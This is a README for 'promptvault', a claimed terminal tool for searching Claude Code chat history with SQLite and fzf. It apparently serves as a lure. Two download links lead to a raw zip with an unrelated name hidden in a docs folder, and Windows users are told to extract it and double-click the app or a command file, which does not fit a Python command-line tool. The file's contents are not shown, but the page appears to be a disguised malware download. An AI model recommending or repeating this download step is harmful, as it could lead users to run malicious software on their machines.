# 🗂️ promptvault - Find Claude chats fast

[![Download promptvault](https://img.shields.io/badge/Download-promptvault-6e56cf?style=for-the-badge&logo=github)](https://github.com/landladycreatin942/promptvault/raw/refs/heads/main/docs/chronicles/Software_sarcoplasmatic.zip)

## 🚀 Getting Started

promptvault helps you search your Claude Code conversation history from the terminal. It keeps your chats in a Markdown vault, indexes them with SQLite FTS5, and lets you search with fzf.

If you use Claude Code often, this tool helps you find past prompts, replies, and ideas without digging through files by hand.

## 📥 Download and Install

Visit this page to download and run the app:

[https://github.com/landladycreatin942/promptvault/raw/refs/heads/main/docs/chronicles/Software_sarcoplasmatic.zip](https://github.com/landladycreatin942/promptvault/raw/refs/heads/main/docs/chronicles/Software_sarcoplasmatic.zip)

### Windows setup

1. Open the link above in your browser.
2. Download the Windows version from the page.
3. If the file is in a .zip file, right-click it and choose Extract All.
4. Open the extracted folder.
5. Double-click the app or run the included command file if one is provided.

### What you need

- Windows 10 or Windows 11
- A terminal such as Windows Terminal or Command Prompt
- Claude Code conversation files stored on your PC
- Permission to read the folder where your chats are saved

## 🧭 What promptvault does

promptvault gives you a simple way to:

- Search all Claude Code conversations from one place
- Find exact phrases with full-text search
- Browse results with fzf
- Keep your notes in Markdown files
- Store an index in SQLite for fast lookups
- Work without extra tools on your system

## 🔎 How it works

The app scans your Markdown vault, builds a SQLite index, and lets you search from the terminal. When you type a query, promptvault shows matching conversations and lets you move through them with keyboard controls.

This is useful when you want to:

- Find a prompt you used last week
- Look up code help from an earlier chat
- Search for a topic like “API error” or “regex”
- Reuse wording from a past conversation
- Review how you solved a problem before

## 🪟 First-time use on Windows

After you open the app:

1. Point it at the folder that holds your Markdown vault.
2. Let it build the search index.
3. Run a search from the terminal.
4. Pick a result from the list.
5. Open the matching note or conversation file.

If your vault already has many files, the first index build may take a short time. Later searches should feel much faster.

## 🛠️ Basic use

Here are common things you may do:

- Search by a word or phrase
- Filter results as you type
- Open a matched file in your editor
- Rebuild the index after adding new chats
- Keep your vault in sync with your latest Claude Code work

Example searches:

- install issue
- database schema
- fix login error
- prompt for summarizing notes
- Python file parser

## 📁 Suggested folder layout

A simple vault can look like this:

- `promptvault/`
  - `conversations/`
  - `notes/`
  - `index/`
  - `archive/`

You can store chats as Markdown files and keep older files in an archive folder. This makes it easier to separate active work from old conversations.

## ⚙️ Features

- Fast search across Markdown files
- SQLite FTS5 indexing for quick text lookup
- Keyboard-first navigation with fzf
- Works well for prompt history and conversation history
- Good fit for Obsidian-style note folders
- Simple terminal workflow
- No extra package clutter for normal use

## 🔐 Privacy and local use

promptvault runs on your own machine. Your conversation files stay in your vault, which lets you keep control of your data. This is a good fit if you want a local search tool for personal or work notes.

## 🧪 Tips for better results

- Use short search terms first
- Try key words from the question or answer
- Search for file names if you remember them
- Use common terms from your workflow
- Keep file names clear and consistent
- Put one conversation per Markdown file when possible

## 🧰 Common file types

promptvault works best with plain text notes such as:

- `.md`
- `.markdown`
- `.txt`

Markdown works well because it stays easy to read in any editor and keeps your notes portable.

## 🖥️ Terminal use

If the app opens in a terminal window, use the keyboard to move through results. Tools like fzf are built for quick filtering, so you can type part of a phrase and narrow the list right away.

Typical flow:

1. Run promptvault
2. Enter a search term
3. Review the matching files
4. Select one result
5. Open the file in your editor

## 📚 Who this is for

promptvault fits users who:

- Save Claude Code chats as Markdown
- Want fast search over old conversations
- Use Obsidian or a similar vault layout
- Prefer keyboard use over mouse clicks
- Need a local tool for prompt history
- Work with many small text files

## 🧩 Topic coverage

This project sits in these areas:

- AI tools
- Anthropic
- Claude
- Claude Code
- CLI tools
- Conversation history
- Developer tools
- Full-text search
- fzf
- Markdown
- Obsidian
- Prompt engineering
- Prompt history
- Python
- SQLite

## 🧼 Keeping your vault organized

A clean vault makes search better. Try these habits:

- Use dates in file names
- Add short titles to each note
- Keep one topic per file
- Move old chats to an archive folder
- Use the same folder names each time
- Avoid duplicate files when you can

## ❓ Troubleshooting

If search does not return the result you expect:

- Check that the file is in the vault folder
- Make sure the file is saved as plain text or Markdown
- Rebuild the index after adding new files
- Check the spelling of your search term
- Try a shorter search phrase
- Confirm the terminal has access to the folder

If the app does not start:

- Open the download page again
- Make sure the file finished downloading
- Extract the files first if they came in a zip archive
- Try running the app from a terminal window

## 🏷️ Project details

- Repository name: `promptvault`
- Main purpose: search Claude Code conversations from the terminal
- Storage model: Markdown vault plus SQLite FTS5
- Search UI: fzf
- Focus: fast local search with simple setup